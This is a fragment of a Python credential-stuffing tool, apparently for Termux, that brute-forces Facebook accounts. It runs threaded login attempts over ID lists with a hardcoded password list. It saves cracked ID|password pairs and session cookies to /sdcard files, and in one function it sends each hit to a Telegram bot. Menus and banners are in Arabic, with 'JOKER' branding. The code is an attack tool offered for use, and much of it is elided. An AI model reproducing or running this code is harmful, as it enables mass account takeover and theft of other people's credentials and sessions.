#FUCKED BY JOKER: @Theyhates_joker oN: @JokerToolzz 🔥❄. 
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠲⢤⣀⣀⠉⠉⠀⠀⠀⠀⠀⠁⠀⣠⠏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠒⠲⠶⠤⠴⠒⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31mMAX-🔥\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
         ⠀⢀⠀⡤⢤⣀⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⢶⠞⢩⣧⡨⠿⠿⢿⡝⠯⠛⠶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣶⠟⠍⠁⢒⠿⡠⠖⠉⠉⢙⣷⠀⠀⠀⠈⠩⣲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢤⡿⣥⡖⣲⣿⣿⣞⣁⣀⠴⢚⣿⠛⣷⡈⣆⠀⠱⡌⠉⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print(' \x1b[1;93mتﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪﻋ❤️ : \033[1;32m'+total_ids)
                        linex()
                        for user in id:
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print('\x1b[1;91m [01] \x1b[1;92mتﺍﺩﺭﻮﺳﺎﺑ ﻪﻘﻳﺮﻃ ﻞﻀﻓﺍ \n\x1b[1;91m [02] \x1b[1;93mيﻮﻗﻮﻣ يﺭﺎﻴﺘﺧ تﺍﺩﺭﻮﺳﺎﺑ \n\x1b[1;91m [03] \x1b[1;94mتﺎﻳﻮﻗ ﺪﻴﻟﺍﻮﻣ تﺍﺩﺭﻮﺳﺎﺑ\n\x1b[1;91m [04] \x1b[1;95mﻦﻫﻮﺑﺮﺟ تﺎﻳﻮﻗ تﺍﺩﺭﻮﺳﺎﺑ ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                        ...
                                        plist.append('mmnnllkkppoo1234')
                                        plist.append('ccxxzzddssaaeewwqq00')
                                        plist.append('xnxx2009porn')
                                        plist.append('noor2000sa')
                                        plist.append('ccvvccllookk2211@')
                                        plist.append('1212ssaa1212ssaa')
                                        plist.append('loon0770mas')
                                        plist.append('qwert12345mnbvc')
                                        plist.append('bass6677077')
                                        plist.append('qwertyuiopasdfghjkl')
                                        plist.append('qqqqwwww')
                                        plist.append('ppooiiuu')
                                        plist.append('llkkjjhhggffddssaa')
                                        ...
                                        plist.append('qwert12345mnbvc')
                                        plist.append('bass6677077')
                                        plist.append('ttyyuuiioo@@1990')
                                        plist.append('gghhjjkkll')
                                        plist.append('aassddff')
                                        plist.append('llkkjjhhgg54321')
                                        plist.append('zzmmxxnnccbbvv')
                                        plist.append('qwertyuiopasdfghjklzxcvbnm')
                                        plist.append('1234512345qwert')
                                        plist.append('10203040')
                                        plist.append('xxooppnnmm123123')
                                        plist.append('aassddddssaa@@@@')
                                        plist.append('bbhhvvggccffxxdd')
                                        plist.append('ccvvccvvxxnn')
                                        plist.append('20242024@@@@')
                                        plist.append('0770770aassdd')
                                        plist.append('ppoo1122qqww')
                                        plist.append('vvggvvgg009988')
                                elif ppp in ['3','03']:                
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print(' \x1b[1;93mتﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪﻋ❤️ : \033[1;32m'+total_ids)
                                        print("\033[1;32m ﻩﺩﺎﻴﻘﻟﺍ ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ🔥")
                                        print("\033[1;34m ﺪﻴﺼﺗﺎﻣ لﻮﻜﺗ ﻻ ﻞﺷﺎﻓ ﻚﻔﻠﻣ اﺫﺇ😏")
                                        print("\033[1;34m 10ﻚﻳﺪﻟ ﺺﺤﻔﻟﺍ نﺎﻛ نﺃ ﺎﺘﺣ رﻮﺒﺻ ﻚﻴﻠﺧ🫡")
                                        linex()
...
def za():
    ...
    if myid in str(body):
        ...
        print(" run again python KOKO92.py")
...
def pak():
                ...
                with tred(max_workers=30) as ASX:     
                        ...
                        print(f'\033[1;32m ﻩﺩﺎﻴﻘﻟﺍ ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as ASX:
                        clear()
                        tl = str(len(user))
                        print(' تﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪﻋ❤️ : \033[1;32m'+tl)
                        print(' \033[1;32m ﻩﺩﺎﻴﻘﻟﺍ ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ')
...
def gmail():
                ...
                with tred(max_workers=30) as ASX:
                        total = str(len(fo))
                        clear()
                        print(' تﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪﻋ❤️ : \033[1;32m'+total)
                        print("\033[1;32m ﻩﺩﺎﻴﻘﻟﺍ ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32m@u1k_k\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [@u1k_k-OK] %s | %s'%(ids,pas))
                                bn = ('\r\r\033[1;32m [@u1k_k-OK] '+ids+' | '+pas+'\033[1;97m')
                                ...
                                open('/sdcard/@u1k_k-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@u1k_k-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [@u1k_k-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@u1k_k-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [@u1k_k] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [@u1k_k-OK] '+ids+' | '+pas+'\033[1;97m')
                                        bn = ('\r\r\033[1;32m [@u1k_k-OK] '+ids+' | '+pas+'\033[1;97m')
                                        requests.post(f"https://api.telegram.org/bot{Goldtok}/sendMessage?chat_id={Goldid}&text="+str(bn))
                                        open('/sdcard/@u1k_k-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/@u1k_kCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@u1k_k-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@u1k_k-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@u1k_k_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@u1k_k-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@u1k_k-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
try:
    ...
    #rndm("01730275908",["01730275908"])
        ...
        Threads = []
for _ in range(50):
    t = threading.Thread(target=golden)
    t.start()
    Threads.append(t)
